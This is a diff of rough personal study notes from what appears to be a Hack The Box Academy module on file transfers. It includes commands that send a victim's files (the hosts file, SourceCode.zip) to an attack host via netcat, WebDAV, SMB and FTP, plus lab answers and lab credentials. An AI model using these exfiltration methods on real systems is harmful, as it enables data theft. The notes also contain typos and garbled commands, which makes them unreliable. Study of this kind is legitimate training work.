@@ -141,3 +141,77 @@ PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Win
 use Netcat to listen in on a port specify and send the file as POST request. -> copy the output and use the base64 decode function to convert the base 64 string into a file
 PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
 PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+-we catch base64 data with Netcat and use the base64 application with the decode option to convert the string to the file 
+$nc -lvnp 8000
+$echo <base64> | base64 -d -w 0 > hosts
+\\SMB uploads
+company usually allow outbound traffic using HTTP(TCP/80) and HTTPS (TCP/443) protocol. commonly enterprises don't alow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential atk/
+- for more infor. read the Microsoft post prevent SMB traffic from lateral connections and entering or leaving the network
+-an alternative is to run SMB over Http with WebDav.WebDav (RFC 4918) is extension of HTTP, the internet protocol that web browser and web server use to comm with each other.
+-the WebDAV protocol enables a webserver to behave like a file server, supporting collaborative content authoring. WebDAV can also use HTTPS
+- when use SMB it will first attempt to conn using the SMB protocol and if there's no SMB share available, it will try to conn using HTTP, in the following Wireshark  capture,
+attempt to conn to the file share testing3, and because it didn;t find anything with SMB it uses HTTP.
+\\Configurating WebDav Server
+-need install 2 modules, wsgidav and cheroot https://github.com/mar10/wsgidav  -> run the wsgidav
+$sudo pip3 install wsgidav cheroot
+\\Using the WebDav Python module
+-sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+\\Connecting to the Webdav share
+->attempt to connect to the share using DavWWWRoot directory
+$dir \\192.168.49.128\DavWWWRoot
+NOTE: DavWWWRoot is special keword recognized by the Windows Shell. No Such folder exists on your WebDAV server. the DavWWWRoot keyword tells the Mini-Redirector driver.which handles WebDAV request that you are conn to the root of the WebDAV server
+-you can avoid using this keyword if you specify a folder that exists on server when conn to the server for ex: \192.168.49.128\sharefolder
+\\Uploading Files using SMB
+C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
+NOTE: if there are no SMB (TCP/445) restrictions you can use impacket-smbserver the same way we set it up for download operations
+\\FTP uploads
+upload file using FTP very simlilar with downloading files. -use PS or the FTP client to complete the operation. before stat FTP server using the python module pyftpdlib. we need to specify the option --write to allow clients to upload files to our atk host
+$sudo python3 -m pyftpdlib --port 21 --write
+-> let use PS upload function to upload a file to our FTP server
+\\PowerShell Upload File
+PS C:\htb> (New-Objec129t Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+\\Cerate a Command File for the FTP Client to Upload a File
+C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+C:\htb> echo USER anonymous >> ftpcommand.txt
+C:\htb> echo binary >> ftpcommand.txt
+C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+C:\htb> echo bye >> ftpcommand.txt
+C:\htb> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+
+Log in with USER and PASS first.
+
+
+ftp> USER anonymous
+ftp> PUT c:\windows\system32\drivers\etc\hosts
+ftp> bye
+<test> 10.129.27.46
+Download the file flag.txt from the web root using wget from the Pwnbox. 
+Submit the contents of the file as your answer.
+(New-Object System.Net.WebClient).DownloadFile('http://STMIP/flag.txt', "/home/htb-ac413848/flag.txt")
+$wget http://STMIP/flag.txt  -> type ./flag.txt
+<test>Upload the attached file named upload_win.zip to the target using the method o
+f your choice. Once uploaded, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer.
+wget https://academy.hackthebox.com/storage/modules/24/upload_win.zip
+-> $xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!:
+-> start http server on target $python3 -m http.server <port>
+-> upload file $iwr http://<iptarget>:<port>/upload_win.zip -OutFile upload_win.zip
+-> $Expand-Archive .\upload_win.zip
+-> $hasher.exe .\upload_win\upload_win.txt
+<test>Connect to the target machine via RDP and practice various file transfer operations
+ (upload and download) with your attack host. Type "DONE" when finished
+ <1> utilize $urlretrieve function from the urllib.request 
+$python3 -> import urllib.request as request ->cat
+$request.urlretrieve("http://STMIP/flag.txt", "flag.txt");
+<2> $ssh htb-student@STMIP (HTB_@cademy_stdnt!:)
+wget https://academy.hackthebox.com/storage/modules/24/upload_nix.zip
+unzip upload_nix.zip
+->$scp upload_nix.txt htb-student@SMTIP:~/
+or -> listens on aport and redirect the input it receives 
+$nc -lp <port9999> > upload_nix.txt  --> nc -w 3 stmip stmport < upload_nix.txt
+-> $haser upload_nix.txt
+
+\\\\\\\========================================
+Linux File Transfer methods
+few download method
